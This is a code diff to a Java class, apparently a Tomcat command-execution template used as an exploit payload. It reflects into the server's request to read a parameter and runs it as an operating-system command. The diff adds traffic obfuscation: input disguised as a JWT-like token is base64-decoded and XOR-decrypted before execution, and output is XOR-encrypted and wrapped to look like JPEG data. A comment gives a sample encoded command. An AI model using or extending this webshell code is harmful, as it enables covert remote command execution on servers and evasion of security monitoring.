@@ -7,6 +7,7 @@ import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Scanner;
 
+// calc命令：eyJeXA10TbkhnteAiS0PtwRFQKqp5EYIIWXXXLKXDf5NPTs2M1FykATD[命令].eyJ82Df13d=
 public class TomcatCmdExecTpl {
 
     static {
@@ -15,7 +16,8 @@ public class TomcatCmdExecTpl {
         } catch (Exception e) {
         }
     }
-    public TomcatCmdExecTpl() throws Exception{
+
+    public TomcatCmdExecTpl() throws Exception {
         run();
     }
 
@@ -82,7 +84,7 @@ public class TomcatCmdExecTpl {
                                 if (var7 != null) {
                                     Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4, new Object[0]);
                                     Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
-                                    writer.write(exec(var7));
+                                    writer.write(handle(var7));
                                     writer.flush();
                                     writer.close();
                                     break;
@@ -100,7 +102,7 @@ public class TomcatCmdExecTpl {
     }
 
     // 执行模块
-    private  String exec(String cmd) {
+    private static String exec(String cmd) {
         try {
             boolean isLinux = true;
             String osType = System.getProperty("os.name");
@@ -119,5 +121,66 @@ public class TomcatCmdExecTpl {
         } catch (Exception e) {
             return e.getMessage();
         }
+    }
+
+    private static String handle(String param) throws Exception {
+        String encTag = "eyJeXA";
+        
+        String cmd = null;
+
+        if (param.startsWith(encTag)) {
+            // 控制混淆长度标识数量，字符1代表
+            int num = Integer.parseInt(String.valueOf(param.charAt(encTag.length())));
+
+            // 混淆字符串的总和长度
+            int count = 0;
+            for (int i = 0; i < num; i++) {
+                count += param.charAt(encTag.length() + 1 + i);
+            }
+
+            // 请求参数格式：eyJ0eXA[string数字标识后面参数的长度][控制随机混淆字符串的长度ascii值][混淆字符串][xor+base64 命令字符串].[随机字符串]
+            // param => base64decode => xor => exec() => xor => base64encode
+            cmd = new String(x(base64Decode(param.substring(encTag.length() + 1 + num + count, param.indexOf(".")))));
+            return "/9j/4A" + base64Encode(x(exec(cmd).getBytes())) + "/9k==";
+        } else {
+            return exec(param);
+        }
+
+    }
+
+    private static byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception var4) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+
+
+    public static String base64Encode(byte[] input) throws Exception {
+        String value = null;
+        Class base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, input);
+        } catch (Exception var6) {
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object Encoder = base64.newInstance();
+            value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
+        }
+        return value;
+    }
+
+    public static byte[] x(byte[] data) {
+        byte[] key = "???????????????".getBytes();
+        byte[] result = new byte[data.length];
+        for (int i = 0; i < data.length; i++) {
+            result[i] = (byte) (data[i] ^ key[i % key.length]);
+        }
+        return result;
     }
 }
